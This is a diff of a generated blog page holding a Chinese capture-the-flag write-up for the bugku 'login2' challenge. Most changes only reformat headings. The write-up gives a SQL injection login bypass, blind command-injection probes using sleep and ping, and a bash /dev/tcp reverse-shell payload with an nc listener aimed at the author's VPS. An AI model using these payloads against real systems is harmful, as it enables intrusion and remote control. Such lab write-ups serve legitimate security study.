@@ -17,7 +17,7 @@
 <meta property="og:locale" content="default">
 <meta property="og:image" content="http://yoursite.com/2018/07/12/CTF-bugku-login2/1.bmp">
 <meta property="og:image" content="http://yoursite.com/2018/07/12/CTF-bugku-login2/2.bmp">
-<meta property="og:updated_time" content="2018-07-17T15:27:55.402Z">
+<meta property="og:updated_time" content="2018-11-05T13:04:07.790Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="bugku-login2-witeup">
 <meta name="twitter:description" content="前言这是一道命令注入的题目，需要用到vps，所以第一次遇到这道题目时没有做出来，由于前两天刚刚买了一台vps，所以马上把这道题翻出来做。 登录首先打开题目是一个登录框，题目提示有union，且在页面返回的响应头有一个tip，base64解码后的内容为">
@@ -180,10 +180,11 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这是一道命令注入的题目，需要用到vps，所以第一次遇到这道题目时没有做出来，由于前两天刚刚买了一台vps，所以马上把这道题翻出来做。</p>
-<h3 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h3><p>首先打开题目是一个登录框，题目提示有union，且在页面返回的响应头有一个tip，base64解码后的内容为<br><a id="more"></a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT username,password FROM admin WHERE username='"</span>.$username.<span class="string">"'"</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($row) &amp;&amp; $row[<span class="string">'password'</span>]===md5($password))&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这是一道命令注入的题目，需要用到vps，所以第一次遇到这道题目时没有做出来，由于前两天刚刚买了一台vps，所以马上把这道题翻出来做。</p>
+<h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><p>首先打开题目是一个登录框，题目提示有union，且在页面返回的响应头有一个tip，base64解码后的内容为<br><a id="more"></a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT username,password FROM admin WHERE username='"</span>.$username.<span class="string">"'"</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($row) &amp;&amp; $row[<span class="string">'password'</span>]===md5($password))&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>利用以下payload即可登陆成功<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">username</span>=a' union select 1,md5(1)#&amp;<span class="attribute">password</span>=1</span><br></pre></td></tr></table></figure></p>
-<h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p>打开后发现是一个进程监控系统，在post的变量c里面改变传入的值试一下<br><img src="/2018/07/12/CTF-bugku-login2/1.bmp" alt=""><br>注意倒数第二个命令，百度bash后得到如下结果</p>
+<h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p>打开后发现是一个进程监控系统，在post的变量c里面改变传入的值试一下<br><img src="/2018/07/12/CTF-bugku-login2/1.bmp" alt=""><br>注意倒数第二个命令，百度bash后得到如下结果</p>
 <ul>
 <li><p>sh -c sh即shell，表示命令从-c后的字符串读取</p>
 </li>
@@ -195,15 +196,18 @@
 </li>
 </ul>
 <p>所以最后我们的拼接就是grep和c的内容</p>
-<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>测试一下会不会有命令注入的回显比如这个<br><img src="/2018/07/12/CTF-bugku-login2/2.bmp" alt=""><br>但是发现echo 1并不会回显<br>于是使用这个payload<br><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">c</span>=aa<span class="comment">;sleep 3</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>测试一下会不会有命令注入的回显比如这个<br><img src="/2018/07/12/CTF-bugku-login2/2.bmp" alt=""><br>但是发现echo 1并不会回显<br>于是使用这个payload</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">c</span>=aa<span class="comment">;sleep 3</span></span><br></pre></td></tr></table></figure>
 <p>发现浏览器进行了延迟，也就是进行了命令执行<br>再试一下能否ping外网<br><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">c</span>=aa<span class="comment">;ping www.baidu.com</span></span><br></pre></td></tr></table></figure></p>
 <p>浏览器同样延迟执行，说明ping成功</p>
-<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>payload:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="number">123</span>;bash -i &gt;&amp; /dev/tcp/your vps ip/<span class="number">8888</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">nc -l -p <span class="number">8888</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>payload:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="number">123</span>;bash -i &gt;&amp; /dev/tcp/your vps ip/<span class="number">8888</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">nc -l -p <span class="number">8888</span></span><br></pre></td></tr></table></figure></p>
 <p>这里遇到了玄学之处，在hackbar里面使用一摸一样的payload就不行，而在执行框里面点击执行就可以<br>原因是hackerbar在post数据的时候不会进行url编码</p>
 <ul>
 <li>原理<br><a href="https://segmentfault.com/a/1190000010975294" target="_blank" rel="noopener">https://segmentfault.com/a/1190000010975294</a></li>
-<li>其他反弹<br><a href="https://mp.weixin.qq.com/s?__biz=MzIxMDYyNTk3Nw==&amp;mid=2247484014&amp;idx=1&amp;sn=c561772d92a0f7739253c3f3c161287f&amp;chksm=9760f6b8a0177faed4aabf6a64df3acd5beee83c94d85513f59cb3a66f87133bb73812d8a442&amp;mpshare=1&amp;scene=23&amp;srcid=0625zVPaQwhxlbc9uSVISLU1#rd" target="_blank" rel="noopener">这个是微信的链接</a><h3 id="其他姿势"><a href="#其他姿势" class="headerlink" title="其他姿势"></a>其他姿势</h3>不用vps而用时间盲注的方法来获得flag<br><a href="http://www.cnblogs.com/blili/p/9045280.html" target="_blank" rel="noopener">http://www.cnblogs.com/blili/p/9045280.html</a><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><a href="http://www.bugku.com/thread-80-1-1.html" target="_blank" rel="noopener">http://www.bugku.com/thread-80-1-1.html</a><br><a href="https://blog.csdn.net/fengpenny/article/details/55503793" target="_blank" rel="noopener">https://blog.csdn.net/fengpenny/article/details/55503793</a><br><a href="https://blog.csdn.net/wynter_/article/details/73825978" target="_blank" rel="noopener">https://blog.csdn.net/wynter_/article/details/73825978</a><br><a href="https://blog.csdn.net/chinabestchina/article/details/72686002" target="_blank" rel="noopener">https://blog.csdn.net/chinabestchina/article/details/72686002</a></li>
+<li>其他反弹<br><a href="https://mp.weixin.qq.com/s?__biz=MzIxMDYyNTk3Nw==&amp;mid=2247484014&amp;idx=1&amp;sn=c561772d92a0f7739253c3f3c161287f&amp;chksm=9760f6b8a0177faed4aabf6a64df3acd5beee83c94d85513f59cb3a66f87133bb73812d8a442&amp;mpshare=1&amp;scene=23&amp;srcid=0625zVPaQwhxlbc9uSVISLU1#rd" target="_blank" rel="noopener">这个是微信的链接</a><h2 id="其他姿势"><a href="#其他姿势" class="headerlink" title="其他姿势"></a>其他姿势</h2></li>
 </ul>
+<p>不用vps而用时间盲注的方法来获得flag<br><a href="http://www.cnblogs.com/blili/p/9045280.html" target="_blank" rel="noopener">http://www.cnblogs.com/blili/p/9045280.html</a></p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="http://www.bugku.com/thread-80-1-1.html" target="_blank" rel="noopener">http://www.bugku.com/thread-80-1-1.html</a><br><a href="https://blog.csdn.net/fengpenny/article/details/55503793" target="_blank" rel="noopener">https://blog.csdn.net/fengpenny/article/details/55503793</a><br><a href="https://blog.csdn.net/wynter_/article/details/73825978" target="_blank" rel="noopener">https://blog.csdn.net/wynter_/article/details/73825978</a><br><a href="https://blog.csdn.net/chinabestchina/article/details/72686002" target="_blank" rel="noopener">https://blog.csdn.net/chinabestchina/article/details/72686002</a></p>
 
       
 
@@ -346,7 +350,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#登录"><span class="toc-number">2.</span> <span class="toc-text">登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#命令注入"><span class="toc-number">3.</span> <span class="toc-text">命令注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#测试"><span class="toc-number">4.</span> <span class="toc-text">测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#反弹shell"><span class="toc-number">5.</span> <span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#其他姿势"><span class="toc-number">6.</span> <span class="toc-text">其他姿势</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考文章"><span class="toc-number">7.</span> <span class="toc-text">参考文章</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#登录"><span class="toc-number">2.</span> <span class="toc-text">登录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#命令注入"><span class="toc-number">3.</span> <span class="toc-text">命令注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#测试"><span class="toc-number">4.</span> <span class="toc-text">测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#反弹shell"><span class="toc-number">5.</span> <span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#其他姿势"><span class="toc-number">6.</span> <span class="toc-text">其他姿势</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考文章"><span class="toc-number">7.</span> <span class="toc-text">参考文章</span></a></li></ol>
                     </div>
                 </span>
             </div>
@@ -509,6 +513,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">homepage</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">Crypto</a>
               </li>
             
             <div class="clearfix"></div>
